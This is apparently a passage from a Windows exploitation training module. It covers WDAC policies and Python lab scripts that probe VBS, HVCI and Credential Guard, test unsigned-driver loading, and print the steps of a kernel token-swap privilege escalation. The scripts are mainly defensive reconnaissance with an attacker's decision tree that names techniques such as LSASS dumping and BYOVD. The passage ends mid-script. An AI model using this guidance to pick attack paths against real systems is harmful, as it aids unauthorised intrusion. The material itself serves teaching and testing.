Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy" -Name "VerifiedAndReputablePolicyState"
```

**Impact on Exploitation**:

- Blocks unknown/unsigned executables
- Prevents running custom tools (initially)
- Attackers must use LOLBins or signed tools
- Significantly raises bar for initial access

#### Windows Defender Application Control (WDAC)

**What is WDAC?**:

- Enterprise-grade application whitelisting
- Kernel-enforced code integrity
- Replaces AppLocker for high-security scenarios
- Uses Code Integrity policies (.p7b files)

**WDAC vs AppLocker**:

| Feature           | AppLocker    | WDAC         |
| ----------------- | ------------ | ------------ |
| Enforcement       | User-mode    | Kernel-mode  |
| Bypass difficulty | Medium       | Hard         |
| Configuration     | GPO rules    | CI Policies  |
| DLL blocking      | Limited      | Full support |
| Driver blocking   | No           | Yes          |
| Managed installer | No           | Yes          |
| Performance       | Low overhead | Low overhead |

**WDAC Policy Creation**:

```bash
# Create base policy from system scan
New-CIPolicy -ScanPath "C:\Windows" `
    -Level Publisher `
    -UserPEs `
    -FilePath "BasePolicy.xml"

# Add trusted publisher
Add-SignerRule -FilePath "BasePolicy.xml" `
    -CertificatePath "trusted.cer" `
    -Kernel -User

# Merge policies
Merge-CIPolicy -PolicyPaths @("BasePolicy.xml", "CustomRules.xml") `
    -OutputFilePath "MergedPolicy.xml"

# Convert to binary
ConvertFrom-CIPolicy "MergedPolicy.xml" "Policy.p7b"

# Deploy (requires admin)
Copy-Item "Policy.p7b" "C:\Windows\System32\CodeIntegrity\SIPolicy.p7b"
# Reboot required for enforcement
```

**WDAC Enforcement Levels**:

```text
File Rule Levels (most to least restrictive):
------------------------------------------------------------

Hash            - Exact file hash only
FileName        - Original filename + version
FilePublisher   - Publisher + product + filename + version
Publisher       - Publisher signature only
SignedVersion   - Any signed version of product
PcaCertificate  - Certificate chain validation
LeafCertificate - End certificate only
WHQLPublisher   - Microsoft WHQL signed
WHQLFilePublisher - WHQL + filename
```

**Checking WDAC Status**:

```bash
# Check if WDAC policy is active
Get-CimInstance -ClassName Win32_DeviceGuard `
    -Namespace root\Microsoft\Windows\DeviceGuard |
    Select-Object UsermodeCodeIntegrityPolicyEnforcementStatus

# Values:
# 0 = Off
# 1 = Audit mode
# 2 = Enforced

# View active policy
citool.exe -lp

# Check specific binary authorization
Get-AuthenticodeSignature "C:\path\to\binary.exe"
```

**WDAC Audit Mode Analysis**:

```bash
# Enable audit mode in policy
Set-RuleOption -FilePath "Policy.xml" -Option 3  # Audit mode

# After deployment, check event log
Get-WinEvent -LogName "Microsoft-Windows-CodeIntegrity/Operational" |
    Where-Object {$_.Id -eq 3076} |  # Audit block events
    Select-Object TimeCreated, Message

# Event ID Reference:
# 3076 - Would have been blocked (audit)
# 3077 - Blocked (enforcement)
# 3089 - Signing info for blocked file
```

### Practical Exercise

#### VBS/HVCI Status Probe

```python
#!/usr/bin/env python3
"""
vbs_hvci_probe.py — Probe VBS and HVCI status via WMI and registry
Demonstrates: Detecting active mitigations before exploitation.

Real-world attackers check VBS/HVCI status early in the kill chain.
If HVCI is on, kernel shellcode attacks are futile — pivot to data-only.
If Credential Guard is on, mimikatz credential dumping fails — pivot to
Kerberos delegation or phishing for tokens.

Requirements: Run on Windows as Administrator (for WMI queries)
Usage: python vbs_hvci_probe.py
"""
import subprocess
import json
import sys
import os

def run_ps(command):
    """Run a PowerShell command and return stdout."""
    try:
        result = subprocess.run(
            ["powershell", "-NoProfile", "-Command", command],
            capture_output=True, text=True, timeout=30
        )
        return result.stdout.strip(), result.returncode
    except Exception as e:
        return str(e), -1

def check_vbs_status():
    """Query VBS status via WMI (Win32_DeviceGuard)."""
    print("\n" + "=" * 65)
    print("  VBS (Virtualization-Based Security) Status")
    print("=" * 65)

    query = (
        "Get-CimInstance -ClassName Win32_DeviceGuard "
        "-Namespace root/Microsoft/Windows/DeviceGuard | "
        "Select-Object -Property VirtualizationBasedSecurityStatus, "
        "SecurityServicesConfigured, SecurityServicesRunning, "
        "RequiredSecurityProperties, AvailableSecurityProperties | "
        "ConvertTo-Json"
    )
    output, rc = run_ps(query)

    if rc != 0 or not output:
        print("  [!] Could not query WMI — need Administrator privileges")
        return {}

    try:
        data = json.loads(output)
    except json.JSONDecodeError:
        print(f"  [!] Parse error: {output[:200]}")
        return {}

    # VBS Status
    vbs_status_map = {0: "Disabled", 1: "Enabled (not running)", 2: "Running"}
    vbs_val = data.get("VirtualizationBasedSecurityStatus", -1)
    status_str = vbs_status_map.get(vbs_val, f"Unknown ({vbs_val})")
    icon = "+" if vbs_val == 2 else "-" if vbs_val == 0 else "~"
    print(f"  [{icon}] VBS Status:      {status_str}")

    # Security Services
    svc_map = {1: "Credential Guard", 2: "HVCI", 3: "UEFI Lock",
               4: "SMM Firmware Protection", 5: "Secure Launch",
               6: "Kernel DMA Protection"}

    configured = data.get("SecurityServicesConfigured", [])
    running    = data.get("SecurityServicesRunning", [])

    print(f"\n  Configured Services:")
    for svc in (configured or []):
        name = svc_map.get(svc, f"Unknown ({svc})")
        is_running = svc in (running or [])
        icon = "+" if is_running else "-"
        state = "RUNNING" if is_running else "configured but NOT running"
        print(f"    [{icon}] {name}: {state}")

    if running:
        print(f"\n  Running Services:")
        for svc in running:
            print(f"    [+] {svc_map.get(svc, f'Service {svc}')}")

    return data

def check_hvci_status():
    """Check HVCI (Memory Integrity) via registry."""
    print("\n" + "=" * 65)
    print("  HVCI (Hypervisor-Protected Code Integrity) Status")
    print("=" * 65)

    reg_query = (
        "try { "
        "$val = Get-ItemProperty "
        "-Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard"
        "\\Scenarios\\HypervisorEnforcedCodeIntegrity' "
        "-Name 'Enabled' -ErrorAction Stop; "
        "Write-Output $val.Enabled "
        "} catch { Write-Output 'NOT_CONFIGURED' }"
    )
    output, _ = run_ps(reg_query)

    if output == "1":
        print("  [+] HVCI: ENABLED (unsigned kernel code blocked)")
        print("  [+] Implication: Kernel shellcode attacks will fail")
        print("  [+] Attacker must use: data-only attacks or BYOVD")
    elif output == "0":
        print("  [-] HVCI: DISABLED (unsigned kernel code allowed)")
        print("  [-] Implication: Kernel shellcode attacks are viable")
    else:
        print(f"  [~] HVCI: {output} (may not be configured via registry)")

    return output

def check_credential_guard(vbs_data):
    """Check Credential Guard status (registry + actual running state)."""
    print("\n" + "=" * 65)
    print("  Credential Guard Status")
    print("=" * 65)

    # Check registry configuration
    query = (
        "try { "
        "$lsa = Get-ItemProperty "
        "-Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' "
        "-Name 'LsaCfgFlags' -ErrorAction Stop; "
        "Write-Output $lsa.LsaCfgFlags "
        "} catch { Write-Output 'NOT_SET' }"
    )
    output, _ = run_ps(query)

    cfg_map = {"0": "Disabled", "1": "Enabled with UEFI lock",
               "2": "Enabled without lock"}
    status = cfg_map.get(output, f"Unknown ({output})")

    # Check if actually running (from WMI data)
    running = vbs_data.get("SecurityServicesRunning", [])
    cg_running = 1 in running

    # Check Windows edition
    edition_query = "Get-ComputerInfo | Select-Object -ExpandProperty WindowsEditionId"
    edition, _ = run_ps(edition_query)
    is_enterprise = "Enterprise" in edition or "Education" in edition

    print(f"  Registry Config: {status}")
    print(f"  Actually Running: {'YES' if cg_running else 'NO'}")
    print(f"  Windows Edition: {edition.strip()}")

    if output in ("1", "2") and cg_running:
        print(f"  [+] Credential Guard: ACTIVE")
        print("  [+] Implication: mimikatz sekurlsa::logonpasswords will fail")
        print("  [+] NTLM hashes isolated in VTL 1 (Secure World)")
    elif output in ("1", "2") and not cg_running:
        print(f"  [!] Credential Guard: CONFIGURED but NOT RUNNING")
        if not is_enterprise:
            print("  [!] Reason: Windows Pro/Home does not support Credential Guard")
            print("  [!] Requires: Windows Enterprise or Education edition")
        else:
            print("  [!] Check Event Viewer for errors:")
            print("      Applications and Services Logs -> Microsoft -> Windows -> DeviceGuard")
        print("  [-] Implication: LSASS credential dumping IS POSSIBLE")
    else:
        print(f"  [-] Credential Guard: {status}")
        print("  [-] Implication: LSASS credential dumping is possible")

    return cg_running

def check_secure_boot():
    """Check Secure Boot status (required for VBS integrity)."""
    print("\n" + "=" * 65)
    print("  Secure Boot Status")
    print("=" * 65)

    output, _ = run_ps("Confirm-SecureBootUEFI")
    if "True" in output:
        print("  [+] Secure Boot: ENABLED")
        print("  [+] UEFI bootkit attacks (BlackLotus) mitigated")
    elif "False" in output:
        print("  [-] Secure Boot: DISABLED")
        print("  [-] VBS can be bypassed by firmware-level attacks")
    else:
        print(f"  [?] Secure Boot: {output}")

def check_speculation_mitigations():
    """Check CPU speculation attack mitigations."""
    print("\n" + "=" * 65)
    print("  CPU Speculation Mitigations (Meltdown/Spectre)")
    print("=" * 65)

    query = (
        "try { "
        "$spec = Get-SpeculationControlSettings 2>$null; "
        "$spec | ConvertTo-Json -Depth 3 "
        "} catch { Write-Output 'MODULE_NOT_FOUND' }"
    )
    output, _ = run_ps(query)

    if "MODULE_NOT_FOUND" in output or not output:
        print("  [!] SpeculationControl module not installed")
        print("  [*] Install: Install-Module -Name SpeculationControl -Force")
        return

    try:
        data = json.loads(output)
        checks = [
            ("KVAShadowWindowsSupportEnabled", "KVA Shadow (Meltdown)"),
            ("BTIWindowsSupportEnabled",       "BTI Mitigation (Spectre v2)"),
            ("BTIHardwarePresent",             "BTI Hardware (IBRS/IBPB)"),
            ("SSBDHardwarePresent",            "SSBD (Spectre v4)"),
            ("L1TFWindowsSupportEnabled",      "L1TF Mitigation (Foreshadow)"),
            ("MDSWindowsSupportEnabled",       "MDS Mitigation (Zombieload)"),
        ]
        for key, name in checks:
            val = data.get(key, "N/A")
            icon = "+" if val == True else "-" if val == False else "?"
            print(f"  [{icon}] {name}: {val}")
    except json.JSONDecodeError:
        print(f"  [!] Could not parse: {output[:200]}")

def exploitation_decision_tree(vbs_data):
    """Based on detected mitigations, show what attack paths remain."""
    print("\n" + "=" * 65)
    print("  EXPLOITATION DECISION TREE")
    print("=" * 65)

    vbs_val = vbs_data.get("VirtualizationBasedSecurityStatus", 0)
    running = vbs_data.get("SecurityServicesRunning", [])

    hvci_on = 2 in (running or [])
    cg_on   = 1 in (running or [])

    print("\n  Based on detected configuration:\n")

    if vbs_val != 2:
        print("  VBS is OFF:")
        print("    -> Kernel shellcode injection is viable")
        print("    -> unsigned driver loading is possible")
        print("    -> LSASS credential dumping works")
        print("    -> Token manipulation is straightforward")
        print("    -> Recommended attack: classic kernel exploit + shellcode")
    else:
        print("  VBS is ON:")
        if hvci_on:
            print("    HVCI ENABLED:")
            print("      [-] Kernel shellcode -> BLOCKED")
            print("      [-] Unsigned driver load -> BLOCKED")
            print("      [+] BYOVD (signed vulnerable driver) -> VIABLE")
            print("      [+] Data-only attack (token swap) -> VIABLE")
            print("      [+] Logic bugs in signed code -> VIABLE")
        if cg_on:
            print("    CREDENTIAL GUARD ENABLED:")
            print("      [-] mimikatz logonpasswords -> BLOCKED")
            print("      [-] NTLM hash extraction -> BLOCKED")
            print("      [+] Kerberos ticket relay -> VIABLE")
            print("      [+] Token impersonation -> VIABLE")
            print("      [+] Phishing for credentials -> VIABLE")

        if not hvci_on and not cg_on:
            print("    No security services running in VBS")
            print("    -> VBS infrastructure present but unused")

    print("\n  Key insight: Modern exploitation is about finding")
    print("  the GAPS between mitigation layers, not brute-forcing through them.")

def main():
    print("=" * 65)
    print("  VBS / HVCI / Credential Guard Mitigation Probe")
    print("  Run as Administrator on target Windows machine")
    print("=" * 65)

    if os.name != "nt":
        print("\n  [!] This script must be run on Windows.")
        print("  [*] On Linux/macOS, use this via:")
        print("      python -c \"from pwn import *; ...\"")
        print("      to probe remote Windows targets via network.")
        print("\n  Showing expected output structure for reference...\n")
        # Demo mode with placeholder output
        print("  [+] VBS Status:           Running")
        print("  [+] HVCI:                 ENABLED")
        print("  [+] Credential Guard:     Enabled with UEFI lock")
        print("  [+] Secure Boot:          ENABLED")
        print("  [-] Speculation (Spectre): Install SpeculationControl module")
        return

    vbs_data = check_vbs_status()
    check_hvci_status()
    check_credential_guard(vbs_data)
    check_secure_boot()
    check_speculation_mitigations()
    exploitation_decision_tree(vbs_data)

if __name__ == "__main__":
    main()
```

#### HVCI Driver Load Tester

```python
#!/usr/bin/env python3
"""
hvci_driver_test.py — Test HVCI enforcement against driver loading attempts
Demonstrates: How HVCI blocks unsigned kernel code.

This script:
  1. Creates a dummy (unsigned) .sys file
  2. Attempts to register and start it as a kernel service
  3. Monitors the Code Integrity event log for block events
  4. Tests a known signed driver (if available) to show BYOVD path
  5. Reports whether HVCI enforcement is active

Requirements: Run as Administrator on Windows with HVCI capable hardware
Usage: python hvci_driver_test.py
"""
import subprocess
import os
import sys
import tempfile
import struct
import time

def run_cmd(cmd, shell=True):
    """Run a shell command and return (stdout, returncode)."""
    try:
        result = subprocess.run(
            cmd, shell=shell, capture_output=True, text=True, timeout=30
        )
        return result.stdout.strip(), result.stderr.strip(), result.returncode
    except Exception as e:
        return "", str(e), -1

def run_ps(command):
    """Run a PowerShell command."""
    return run_cmd(f'powershell -NoProfile -Command "{command}"')

def create_dummy_driver(path):
    """
    Create a minimal dummy .sys file (invalid PE but non-zero).
    This is NOT a real driver — it will fail signature checks.
    """
    # Minimal DOS header + PE signature (enough for sc to try loading)
    # MZ header
    mz_header = b"MZ" + b"\x00" * 58 + struct.pack("<I", 64)  # e_lfanew = 64
    # PE signature
    pe_sig = b"PE\x00\x00"
    # COFF header (x64, 1 section, characteristics = EXECUTABLE | LARGE_ADDRESS_AWARE)
    coff = struct.pack("<HHIIIHH",
        0x8664,   # Machine: AMD64
        1,        # NumberOfSections
        0,        # TimeDateStamp
        0,        # PointerToSymbolTable
        0,        # NumberOfSymbols
        0xF0,     # SizeOfOptionalHeader
        0x0022    # Characteristics: EXECUTABLE_IMAGE | LARGE_ADDRESS_AWARE
    )
    # Fill the rest with zeros to make it PE-shaped but unsigned
    padding = b"\x00" * 4096

    with open(path, "wb") as f:
        f.write(mz_header + pe_sig + coff + padding)

    print(f"  [*] Created dummy driver: {path} ({os.path.getsize(path)} bytes)")

def test_unsigned_driver(driver_path):
    """Attempt to load an unsigned driver and observe HVCI response."""
    print("\n" + "=" * 60)
    print("  TEST 1: Unsigned Driver Loading")
    print("=" * 60)

    svc_name = "HVCITestUnsigned"

    # Clean up any previous test
    run_cmd(f"sc delete {svc_name}")
    time.sleep(1)

    # Register the service
    print(f"  [*] Registering service: {svc_name}")
    stdout, stderr, rc = run_cmd(
        f'sc create {svc_name} type= kernel binPath= "{driver_path}"'
    )
    print(f"  [*] sc create: {stdout or stderr} (rc={rc})")

    if rc != 0:
        print(f"  [!] Failed to create service — need Administrator")
        return "ADMIN_REQUIRED"

    # Attempt to start
    print(f"  [*] Attempting to start unsigned driver...")
    stdout, stderr, rc = run_cmd(f"sc start {svc_name}")
    print(f"  [*] sc start: {stdout or stderr} (rc={rc})")

    # Check Code Integrity event log
    print(f"  [*] Checking Code Integrity event log...")
    ps_query = (
        "Get-WinEvent -LogName 'Microsoft-Windows-CodeIntegrity/Operational' "
        "-MaxEvents 5 2>$null | "
        "Where-Object { $_.Id -in @(3077, 3089) } | "
        "Select-Object TimeCreated, Id, Message | "
        "Format-List"
    )
    log_out, _, _ = run_ps(ps_query)
    if log_out:
        print(f"  [+] HVCI Block Events Found:")
        for line in log_out.split("\n")[:10]:
            print(f"      {line}")
        result = "BLOCKED_BY_HVCI"
    else:
        if rc != 0:
            print(f"  [~] Driver failed to load (not a valid driver) but no HVCI event")
            print(f"      This means the PE was rejected before HVCI checks")
            result = "REJECTED_PRE_HVCI"
        else:
            print(f"  [-] Driver loaded! HVCI may not be active")
            result = "LOADED"

    # Cleanup
    run_cmd(f"sc stop {svc_name}")
    run_cmd(f"sc delete {svc_name}")

    return result

def check_byovd_blocklist():
    """Check if the Microsoft Vulnerable Driver Blocklist is active."""
    print("\n" + "=" * 60)
    print("  TEST 2: Vulnerable Driver Blocklist Status")
    print("=" * 60)

    # Check if blocklist is enabled
    ps_cmd = (
        "try { "
        "$ci = Get-ItemProperty "
        "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\CI\\Config' "
        "-Name 'VulnerableDriverBlocklistEnable' -EA Stop; "
        "Write-Output $ci.VulnerableDriverBlocklistEnable "
        "} catch { Write-Output 'NOT_SET' }"
    )
    output, _, _ = run_ps(ps_cmd)

    if output == "1":
        print("  [+] Vulnerable Driver Blocklist: ENABLED")
        print("  [+] Known BYOVD drivers (Capcom.sys, DBUtil, etc.) are blocked")
        print("  [*] Full list: https://learn.microsoft.com/en-us/windows/"
              "security/application-security/application-control/"
              "windows-defender-application-control/design/"
              "microsoft-recommended-driver-block-rules")
    elif output == "0":
        print("  [-] Vulnerable Driver Blocklist: DISABLED")
        print("  [-] BYOVD attacks with known vulnerable drivers are possible")
    else:
        print(f"  [?] Blocklist status: {output}")
        print("  [*] On Windows 11 22H2+, the blocklist is enabled by default")

def check_ci_policy():
    """Check Code Integrity policy enforcement level."""
    print("\n" + "=" * 60)
    print("  TEST 3: Code Integrity Policy")
    print("=" * 60)

    ps_cmd = (
        "Get-CimInstance -ClassName Win32_DeviceGuard "
        "-Namespace root/Microsoft/Windows/DeviceGuard | "
        "Select-Object -Property "
        "CodeIntegrityPolicyEnforcementStatus, "
        "UsermodeCodeIntegrityPolicyEnforcementStatus | "
        "ConvertTo-Json -Compress"
    )
    output, _, rc = run_ps(ps_cmd)

    if rc == 0 and output:
        try:
            import json
            data = json.loads(output)
            kernel_ci = data.get("CodeIntegrityPolicyEnforcementStatus", "N/A")
            user_ci = data.get("UsermodeCodeIntegrityPolicyEnforcementStatus", "N/A")
            ci_map = {0: "Off", 1: "Audit", 2: "Enforced"}

            print(f"  Kernel-mode CI: {ci_map.get(kernel_ci, kernel_ci)}")
            print(f"  User-mode CI:   {ci_map.get(user_ci, user_ci)}")

            if kernel_ci == 2:
                print("  [+] Kernel CI is ENFORCED (HVCI active)")
                print("  [+] Only signed kernel code can execute")
            elif kernel_ci == 1:
                print("  [~] Kernel CI in AUDIT mode (logs but doesn't block)")
            else:
                print("  [-] Kernel CI is OFF")

        except Exception as e:
            print(f"  [!] Parse error: {e}")
            print(f"  [!] Raw output: {output[:200]}")
    else:
        print("  [!] Could not query CI policy")

def main():
    print("=" * 60)
    print("  HVCI Driver Loading Enforcement Tester")
    print("  Must be run as Administrator")
    print("=" * 60)

    if os.name != "nt":
        print("\n  [!] This script must be run on Windows.")
        print("  [*] Expected behavior with HVCI:")
        print("      - Unsigned .sys -> BLOCKED (Event ID 3077)")
        print("      - Signed vulnerable .sys -> ALLOWED (BYOVD risk!)")
        print("      - Blocklisted .sys -> BLOCKED (if blocklist enabled)")
        return

    # Create temp directory for test files
    test_dir = os.path.join(os.environ.get("TEMP", "C:\\Temp"), "hvci_test")
    os.makedirs(test_dir, exist_ok=True)
    driver_path = os.path.join(test_dir, "test_unsigned.sys")

    try:
        create_dummy_driver(driver_path)
        result = test_unsigned_driver(driver_path)

        check_byovd_blocklist()
        check_ci_policy()

        # Final summary
        print("\n" + "=" * 60)
        print("  SUMMARY")
        print("=" * 60)
        if result == "BLOCKED_BY_HVCI":
            print("  [+] HVCI is ACTIVE — unsigned kernel code is blocked")
            print("  [+] Attack vector: BYOVD with signed vulnerable drivers")
        elif result == "REJECTED_PRE_HVCI":
            print("  [~] Driver rejected before HVCI check (invalid PE)")
            print("  [*] HVCI is likely active (check TEST 3 results above)")
            print("  [*] Real unsigned drivers would trigger Event ID 3077")
        elif result == "LOADED":
            print("  [-] Driver was allowed to load — HVCI may not be active")
        else:
            print(f"  [?] Test result: {result}")

        print("\n  [*] Note: To definitively test HVCI, use a real unsigned driver")
        print("  [*] Example: Compile a minimal WDM driver without signing")
        print("  [*] With HVCI on, you'll see Event ID 3077 in Code Integrity log")

    finally:
        # Cleanup
        try:
            os.remove(driver_path)
            os.rmdir(test_dir)
        except OSError:
            pass

if __name__ == "__main__":
    main()
```

#### Kernel Token Attack Simulator

```python
#!/usr/bin/env python3
"""
token_attack_sim.py — Simulate kernel token swap attack and VBS protection
Demonstrates: The exact technique used in CVE-2024-21338, CVE-2023-28252.

This script simulates the attacker's view of a kernel privilege escalation:
  1. Read current process token info
  2. Find SYSTEM token (via NtQuerySystemInformation)
  3. Demonstrate what the kernel read/write primitive would do
  4. Show how VBS/KDP would block the token overwrite

NOTE: This does NOT actually perform kernel exploitation. It simulates
the information gathering and demonstrates protection concepts using
user-mode APIs that mirror what kernel exploits do.

Usage: python token_attack_sim.py
"""
import ctypes
import ctypes.wintypes as wt
import struct
import sys
import os

if os.name != "nt":
    print("This script runs on Windows only.")
    print("\nSimulated output showing attack concept:\n")
    print("=" * 60)
    print("  Kernel Token Swap Attack Simulation")
    print("=" * 60)
    print("""
  Phase 1: Information Gathering
  ─────────────────────────────
  Current PID:        12345
  Current User:       DESKTOP\\user
  Token Type:         Primary
  Integrity Level:    Medium
  Privileges:         SeChangeNotifyPrivilege (enabled)
                      SeIncreaseWorkingSetPrivilege (disabled)

  SYSTEM PID:         4
  SYSTEM Token:       [requires kernel read primitive]

  Phase 2: Attack Simulation
  ──────────────────────────
  Without VBS:
    1. Use kernel R/W to read SYSTEM EPROCESS at 0xFFFF8001`23456789
    2. Read SYSTEM Token at EPROCESS+0x4B8: 0xFFFFAB01`DEADBEEF
    3. Overwrite current EPROCESS+0x4B8 with SYSTEM token
    4. Result: Current process is now SYSTEM +

  With VBS + KDP (if token is KDP-protected):
    1. Same kernel R/W primitive
    2. Read SYSTEM Token: succeeds (VBS allows reads from VTL 0)
    3. Attempt overwrite: BLOCKED by hypervisor
    4. Result: BSOD (KDP violation) -

  With VBS but WITHOUT KDP on Token:
    1. Same kernel R/W primitive
    2. Read SYSTEM Token: succeeds
    3. Overwrite current Token: SUCCEEDS (Token not KDP-registered!)
    4. Result: Current process is SYSTEM +
    This is exactly what CVE-2024-21338 exploited!
""")
    sys.exit(0)

# ── Windows API Setup ──
kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
advapi32 = ctypes.WinDLL("advapi32", use_last_error=True)
ntdll    = ctypes.WinDLL("ntdll",    use_last_error=True)

# Constants
TOKEN_QUERY = 0x0008
TokenUser = 1
TokenIntegrityLevel = 25
TokenPrivileges = 3
TokenStatistics = 10
ProcessBasicInformation = 0

class TOKEN_USER(ctypes.Structure):
    class SID_AND_ATTRIBUTES(ctypes.Structure):
        _fields_ = [("Sid", ctypes.c_void_p), ("Attributes", wt.DWORD)]
    _fields_ = [("User", SID_AND_ATTRIBUTES)]

class TOKEN_STATISTICS(ctypes.Structure):
    _fields_ = [
        ("TokenId", ctypes.c_uint64),
        ("AuthenticationId", ctypes.c_uint64),
        ("ExpirationTime", ctypes.c_int64),
        ("TokenType", ctypes.c_int),
        ("ImpersonationLevel", ctypes.c_int),
        ("DynamicCharged", wt.DWORD),
        ("DynamicAvailable", wt.DWORD),
        ("GroupCount", wt.DWORD),
        ("PrivilegeCount", wt.DWORD),
        ("ModifiedId", ctypes.c_uint64),
    ]

def get_current_token_info():
    """Read current process token information."""
    hToken = wt.HANDLE()
    hProcess = kernel32.GetCurrentProcess()

    if not advapi32.OpenProcessToken(hProcess, TOKEN_QUERY, ctypes.byref(hToken)):
        err = ctypes.get_last_error()
        print(f"  [!] OpenProcessToken failed: {err}")
        if err == 5:  # ERROR_ACCESS_DENIED
            print(f"  [!] Access denied - try running as Administrator")
        return False

    # Get token user (SID -> Username)
    buf_size = wt.DWORD(0)
    advapi32.GetTokenInformation(hToken, TokenUser, None, 0, ctypes.byref(buf_size))
    buf = ctypes.create_string_buffer(buf_size.value)
    if not advapi32.GetTokenInformation(hToken, TokenUser, buf, buf_size, ctypes.byref(buf_size)):
        print(f"  [!] GetTokenInformation failed: {ctypes.get_last_error()}")
        kernel32.CloseHandle(hToken)
        return False

    tu = ctypes.cast(buf, ctypes.POINTER(TOKEN_USER)).contents
    name_buf = ctypes.create_unicode_buffer(256)
    domain_buf = ctypes.create_unicode_buffer(256)
    name_size = wt.DWORD(256)
    domain_size = wt.DWORD(256)
    sid_use = wt.DWORD(0)

    if advapi32.LookupAccountSidW(
        None, tu.User.Sid,
        name_buf, ctypes.byref(name_size),
        domain_buf, ctypes.byref(domain_size),
        ctypes.byref(sid_use)
    ):
        print(f"  Current User:     {domain_buf.value}\\{name_buf.value}")
    else:
        print(f"  Current User:     [Could not resolve SID]")

    # Get token statistics
    stats = TOKEN_STATISTICS()
    ret_len = wt.DWORD(0)
    if advapi32.GetTokenInformation(
        hToken, TokenStatistics,
        ctypes.byref(stats), ctypes.sizeof(stats), ctypes.byref(ret_len)
    ):
        token_type = "Primary" if stats.TokenType == 1 else "Impersonation"
        print(f"  Token Type:       {token_type}")
        print(f"  Token ID:         0x{stats.TokenId:016X}")
        print(f"  Auth ID:          0x{stats.AuthenticationId:016X}")
        print(f"  Privilege Count:  {stats.PrivilegeCount}")

    # Get integrity level
    buf_size = wt.DWORD(0)
    advapi32.GetTokenInformation(hToken, TokenIntegrityLevel, None, 0, ctypes.byref(buf_size))
    buf = ctypes.create_string_buffer(buf_size.value)
    if advapi32.GetTokenInformation(hToken, TokenIntegrityLevel, buf, buf_size, ctypes.byref(buf_size)):
        # Parse the integrity SID
        sid_ptr = ctypes.cast(buf, ctypes.POINTER(ctypes.c_void_p)).contents
        sub_auth_count = ctypes.cast(sid_ptr, ctypes.POINTER(ctypes.c_ubyte))[1]
        if sub_auth_count > 0:
            # Last sub-authority contains the integrity level RID
            rid_offset = 8 + (sub_auth_count - 1) * 4
            rid = struct.unpack_from("<I", ctypes.string_at(sid_ptr, rid_offset + 4), rid_offset)[0]
            level_map = {
                0x0000: "Untrusted", 0x1000: "Low",
                0x2000: "Medium",    0x3000: "High",
                0x4000: "System"
            }
            level = level_map.get(rid, f"Custom (0x{rid:04X})")
            print(f"  Integrity Level:  {level}")

    kernel32.CloseHandle(hToken)
    return True

def simulate_token_attack():
    """Simulate what a kernel exploit would do for token swap."""
    print("\n  Phase 2: Kernel Token Swap Simulation")
    print("  " + "-" * 50)
    print("\n  What a kernel exploit (e.g., CVE-2024-21338) does:")
    print()

    pid = kernel32.GetCurrentProcessId()
    print(f"  1. Current PID: {pid}")
    print(f"     -> Kernel: PsLookupProcessByProcessId({pid})")
    print(f"     -> Returns EPROCESS pointer (e.g., 0xFFFF8001`AABBCCDD)")
    print()
    print(f"  2. SYSTEM PID: 4")
    print(f"     -> Kernel: PsLookupProcessByProcessId(4)")
    print(f"     -> Returns SYSTEM EPROCESS (e.g., 0xFFFF8001`12345678)")
    print()
    print(f"  3. Token offset in EPROCESS (Windows 11 22H2+): +0x4B8")
    print(f"     -> Read SYSTEM EPROCESS+0x4B8 = SYSTEM Token")
    print(f"     -> Token value contains RefCnt in low 4 bits")
    print()
    print(f"  4. Token swap:")
    print(f"     -> Write SYSTEM Token -> current EPROCESS+0x4B8")
    print(f"     -> Current process now has SYSTEM privileges!")
    print()
    print(f"  5. Spawn elevated cmd.exe")
    print(f"     -> CreateProcess('cmd.exe') inherits SYSTEM token")

    print("\n  Protection Analysis:")
    print("  " + "-" * 50)
    print("  VBS OFF:  Token swap SUCCEEDS (no protection)")
    print("  HVCI ON:  Token swap SUCCEEDS (HVCI protects CODE, not DATA)")
    print("  KDP ON:   Token swap FAILS *only if Token is KDP-registered*")
    print()
    print("  REALITY: EPROCESS.Token is NOT KDP-protected in current Windows")
    print("  This is why CVE-2024-21338 worked even with VBS+HVCI enabled!")

def check_vbs_impact():
    """Check if VBS would block this attack on the current system."""
    print("\n  Phase 3: Protection Check")
    print("  " + "-" * 50)

    import subprocess
    query = (
        "Get-CimInstance -ClassName Win32_DeviceGuard "
        "-Namespace root/Microsoft/Windows/DeviceGuard | "
        "Select-Object VirtualizationBasedSecurityStatus, "
        "SecurityServicesRunning | ConvertTo-Json"
    )
    try:
        result = subprocess.run(
            ["powershell", "-NoProfile", "-Command", query],
            capture_output=True, text=True, timeout=15
        )
        import json
        data = json.loads(result.stdout)
        vbs = data.get("VirtualizationBasedSecurityStatus", 0)
        running = data.get("SecurityServicesRunning", [])
        hvci = 2 in (running or [])

        print(f"  VBS Status:  {'Running' if vbs == 2 else 'Not running'}")
        print(f"  HVCI:        {'Enabled' if hvci else 'Disabled'}")
        print()

        if vbs == 2 and hvci:
            print("  [!] VBS+HVCI active, BUT:")
            print("      Token swap attack STILL WORKS!")
            print("      EPROCESS.Token is not KDP-protected.")
            print("      Only data-only attack prevention (future KDP) would stop this.")
        else:
            print("  [-] VBS/HVCI not fully active")
            print("      Kernel shellcode AND token swap attacks are both viable")
    except Exception:
        print("  [!] Could not query VBS status")

def main():
    print("=" * 60)
    print("  Kernel Token Swap Attack Simulation")
    print("  (Educational — does NOT perform actual kernel exploitation)")
    print("=" * 60)

    print("\n  Phase 1: Information Gathering")
    print("  " + "-" * 50)
    print(f"  Current PID:      {kernel32.GetCurrentProcessId()}")

    # Try to get token info, but continue even if it fails
    token_success = get_current_token_info()
    if not token_success:
        print("\n  [*] Continuing with simulation (token info not critical)...")

    simulate_token_attack()
    check_vbs_impact()

    print("\n" + "=" * 60)
    print("  Lab Exercise: Compare this output with/without VBS")
    print("  1. Run with VBS disabled -> note that attack is trivially viable")
    print("  2. Enable VBS+HVCI -> note attack is STILL viable (data-only)")
    print("  3. This proves: HVCI protects code integrity, NOT data integrity")
    print("\n  Note: For full token details, run as Administrator")
    print("=" * 60)

if __name__ == "__main__":
    main()
```

#### Remote Credential Guard Verifier

```python
#!/usr/bin/env python3
"""
cred_guard_verifier.py — Remotely verify Credential Guard enforcement
Demonstrates: How Credential Guard blocks credential extraction.

This script connects to a remote Windows host via WinRM/SMB and
attempts to enumerate credential protection. Useful for red team
